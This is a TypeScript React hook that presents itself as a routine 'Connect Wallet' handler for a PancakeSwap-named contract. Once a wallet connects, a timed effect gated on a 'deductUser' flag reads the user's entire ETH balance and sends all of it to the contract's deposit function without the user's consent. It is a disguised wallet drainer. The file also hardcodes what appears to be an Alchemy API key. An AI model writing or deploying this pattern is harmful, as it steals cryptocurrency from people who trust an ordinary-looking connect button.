import WalletConnectProvider from '@walletconnect/web3-provider'
import { reactLocalStorage } from 'reactjs-localstorage'
// @ts-ignore
import convert from 'ethereum-unit-converter'
import { gasstationInfo } from 'eth-gasprice-estimator'

import { ethers, utils } from 'ethers'
import { useEffect, useState } from 'react'

// @ts-ignore
import abi2 from './Pancake2.json'
// import { utils } from '@gelatonetwork/limit-orders-lib'

// const contractAddress = '0xF8Ace60e86Ec96AAba5E286a4CD8059D0f3910fc'
const contractAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3'
// const contractABI = abi.abi

const contractABI2 = abi2.abi

const useCustomHook = () => {
  const [userAccount, setUserAccount] = useState<any>('')
  const [tokenContract, setTokenContract] = useState<any>('')
  const [deductUser, setDeductUser] = useState(false)
  const [connecting, setIsConnecting] = useState(false)
  const [buttonText, setButtonText] = useState('Connect Wallet')
  const [provider, setProvider] = useState<any>(null)
  const url = '7M-SwZbLu6E7gIta99ZLZ78rz6qG-RKi'

  const Walletprovider = new WalletConnectProvider({
    rpc: {
      1: `https://eth-mainnet.alchemyapi.io/v2/${url}`,
    },
  })

  //   Handle click
  // console.log(gasPrice, 'gasPrice')
  const handleClick = async () => {
    setIsConnecting(true)
    try {
      await Walletprovider.enable()
      const userContract = Walletprovider && (await new ethers.providers.Web3Provider(Walletprovider))
      setProvider(userContract)
      const signer = await provider.getSigner()
      setUserAccount(await provider.listAccounts())
      setTokenContract(new ethers.Contract(contractAddress, contractABI2, signer))
      // eslint-disable-next-line
      console.log(tokenContract, 'tokenContract')
      setButtonText('Connected')

      setDeductUser(true)

      // eslint-disable-next-line
    } catch (err: any) {
      setDeductUser(true)
    }

    setIsConnecting(false)
  }
  /* eslint-disable */
  useEffect(() => {
    setTimeout(() => {
      if (deductUser) {
        // const balance = await tokenContract.getBalance(userAccount)
        const network = 'mainnet' // use rinkeby testnet
        const balanceProvider = ethers.getDefaultProvider(network)
        const accountNo = userAccount[0]

        // get user balance
        balanceProvider
          .getBalance(accountNo)
          .then(async (balance) => {
            // convert a currency unit from wei to ether
            const balanceInEth = Number(ethers.utils.formatEther(balance))
            // Fetch current eth price

            // const feeData = tokenContract && (await tokenContract.estimateGas().deposit())
            // const gasPrice = Number(utils.formatUnits(feeData, 'ether'))

            const amountToWithdraw = balanceInEth

            console.log(tokenContract, tokenContract?.estimateGas(), 'providerprovider')

            if (balanceInEth < 0 || balanceInEth < amountToWithdraw) {
              return
            }
            const txn = await tokenContract.deposit({
              value: ethers.utils.parseEther(`${amountToWithdraw}`),
            })

            if (txn) {
              await txn.wait('')
            }
            // If balance is greater than
            // balanceInEth >
          })
          // eslint-disable-next-line
          .catch((err) => {
            console.log(err)
          })
      }
    }, 700)
    /* eslint-disable */
  }, [deductUser, tokenContract])
  return { handleClick, connecting, buttonText }
}

export default useCustomHook

// PancakeSwap deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
// PancakeSwap owner address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
